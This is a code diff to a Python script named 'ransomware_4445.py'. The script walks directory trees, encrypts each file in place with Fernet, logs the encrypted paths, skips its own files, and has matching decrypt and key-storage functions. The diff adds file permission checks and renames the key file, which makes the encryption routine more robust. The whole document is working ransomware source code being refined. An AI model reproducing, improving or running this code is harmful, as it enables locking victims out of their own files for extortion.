@@ -65,10 +65,11 @@ def encrypt_specific_file(file,key):
 		data = specifiedFile.read()
 	encrypted_data = Fernet(key).encrypt(data)
 
-	with open(file, "wb") as encryptedFile:
-		encryptedFile.write(encrypted_data)
-	with open("./.encrypted_4445.log", "a") as log:
-		log.write(file + "\n")
+	if(has_permission_to_write(file)):
+		with open(file, "wb") as encryptedFile:
+			encryptedFile.write(encrypted_data)
+		with open("./.encrypted_4445.log", "a") as log:
+			log.write(file + "\n")
 
 
 def encrypt_directory(path, key):
@@ -77,7 +78,8 @@ def encrypt_directory(path, key):
 			if(file== "ransomware_4445.py" or file == ".encryption_key_4445.key" or file == ".encrypted_4445.log" or file == ".decrypted_4445.log"):
 				continue
 			file_path = os.path.join(root, file)
-			encrypt_specific_file(file_path, key)
+			if(has_permission_to_read(file_path)):
+				encrypt_specific_file(file_path, key)
 
 
 def decrypt_specific_file(file,key):
@@ -85,19 +87,21 @@ def decrypt_specific_file(file,key):
 		data = specifiedFile.read()
 	decrypted_data = Fernet(key).decrypt(data)
 
-	with open(file, "wb") as encryptedFile:
-		encryptedFile.write(decrypted_data)
-	with open("./.decrypted_4445.log", "a") as log:
-		log.write(file + "\n")
+	if(has_permission_to_write(file)):
+		with open(file, "wb") as encryptedFile:
+			encryptedFile.write(decrypted_data)
+		with open("./.decrypted_4445.log", "a") as log:
+			log.write(file + "\n")
 
 
 def decrypt_directory(path,key):
 	for root, dirs, files in os.walk(path):
 		for file in files:
-			if(file == "ransomware_4445.py" or file == "encryption_key_4445.key" or file == ".encrypted_4445.log" or file == ".decrypted_4445.log"):
+			if(file == "ransomware_4445.py" or file == ".encryption_key_4445.key" or file == ".encrypted_4445.log" or file == ".decrypted_4445.log"):
 				continue
 			file_path = os.path.join(root,file)
-			decrypt_specific_file(file_path,key)
+			if(has_permission_to_read(file_path)):
+				decrypt_specific_file(file_path,key)
 
 
 
@@ -106,12 +110,18 @@ def generate_key():
 	return key
 
 def save_key(key):
-	with open("./.secret_key.key", "wb") as file:
+	with open("./.encryption_key_4445.key", "wb") as file:
 		file.write(key)
 
 def get_key_from_file():
-	with open("./.secret_key.key", "rb") as file:
+	with open("./.encryption_key_4445.key", "rb") as file:
 		return file.read()
+
+def has_permission_to_write(path):
+	return os.access(path, os.W_OK)
+
+def has_permission_to_read(path):
+	return os.access(path, os.R_OK)
 
 
 
